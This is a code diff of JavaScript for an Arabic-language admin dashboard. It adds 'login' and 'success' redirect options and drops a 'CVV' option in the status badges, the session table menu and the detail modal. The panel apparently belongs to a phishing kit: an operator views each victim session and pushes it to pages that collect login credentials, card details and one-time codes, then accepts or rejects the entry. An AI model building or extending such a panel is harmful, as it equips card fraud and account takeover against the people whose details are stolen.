@@ -468,9 +468,9 @@
   function statusBadge(st) {
     if (st === 'accepted') return '<span class="badge accepted">مقبول</span>';
     if (st === 'rejected') return '<span class="badge rejected">مرفوض</span>';
+    if (st === 'redirect_login') return '<span class="badge redirected">توجيه ← تسجيل الدخول</span>';
     if (st === 'redirect_card') return '<span class="badge redirected">توجيه ← البطاقة</span>';
     if (st === 'redirect_otp') return '<span class="badge redirected">توجيه ← الكود</span>';
-    if (st === 'redirect_cvv') return '<span class="badge redirected">توجيه ← CVV</span>';
     return '<span class="badge pending">قيد الانتظار</span>';
   }
 
@@ -500,9 +500,10 @@
           '<div class="redirect-wrap">' +
             '<button class="tbl-btn redirect" onclick="toggleRedirectMenu(this,\''+s.id+'\')">إعادة التوجيه ▾</button>' +
             '<div class="redirect-menu">' +
+              '<button onclick="redirectUser(\''+s.id+'\',\'login\')">صفحة تسجيل الدخول</button>' +
               '<button onclick="redirectUser(\''+s.id+'\',\'card\')">صفحة البطاقة</button>' +
               '<button onclick="redirectUser(\''+s.id+'\',\'otp\')">صفحة الكود</button>' +
-              '<button onclick="redirectUser(\''+s.id+'\',\'cvv\')">صفحة CVV</button>' +
+              '<button onclick="doAction(\'accept\',\''+s.id+'\')">صفحة النجاح</button>' +
             '</div>' +
           '</div>' +
         '</td>' +
@@ -583,9 +584,10 @@
 
     const actions = document.getElementById('modalActions');
     const redirectRow = '<div class="modal-redirect-row">' +
-      '<button class="modal-btn redirect-btn" onclick="redirectUser(\''+id+'\',\'card\')">توجيه ← البطاقة</button>' +
-      '<button class="modal-btn redirect-btn" onclick="redirectUser(\''+id+'\',\'otp\')">توجيه ← الكود</button>' +
-      '<button class="modal-btn redirect-btn" onclick="redirectUser(\''+id+'\',\'cvv\')">توجيه ← CVV</button>' +
+      '<button class="modal-btn redirect-btn" onclick="redirectUser(\''+id+'\',\'login\')">تسجيل الدخول</button>' +
+      '<button class="modal-btn redirect-btn" onclick="redirectUser(\''+id+'\',\'card\')">البطاقة</button>' +
+      '<button class="modal-btn redirect-btn" onclick="redirectUser(\''+id+'\',\'otp\')">الكود</button>' +
+      '<button class="modal-btn redirect-btn" onclick="doAction(\'accept\',\''+id+'\')">النجاح</button>' +
     '</div>';
     if (s.status === 'accepted') {
       actions.innerHTML = '<div class="modal-status" style="color:var(--green);width:100%">تم القبول ✓</div>' + redirectRow;
